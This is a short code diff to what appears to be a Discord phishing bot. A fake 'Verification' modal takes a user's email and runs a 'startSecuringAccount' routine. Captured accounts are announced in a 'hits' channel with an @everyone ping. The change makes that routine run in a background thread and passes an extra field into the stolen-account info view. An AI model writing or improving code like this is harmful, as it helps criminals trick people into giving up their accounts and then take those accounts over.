@@ -223,7 +223,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                         "⌛ Please allow us to proccess your roles...", ephemeral=True
                     )
 
-                    finalEmbeds = await startSecuringAccount(self.email.value, device) 
+                    finalEmbeds = await asyncio.to_thread(startSecuringAccount, self.email.value, device) 
                     if not finalEmbeds:
                         
                         await logs_channel.send(
@@ -240,7 +240,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     await hits_channel.send("@everyone **Successfully secured an account.**")
                     await hits_channel.send(
                         embed = finalEmbeds[0],
-                        view = accountInfo(finalEmbeds[1], interaction.user)
+                        view = accountInfo(finalEmbeds[1], finalEmbeds[2], interaction.user)
                     )
 
                     return
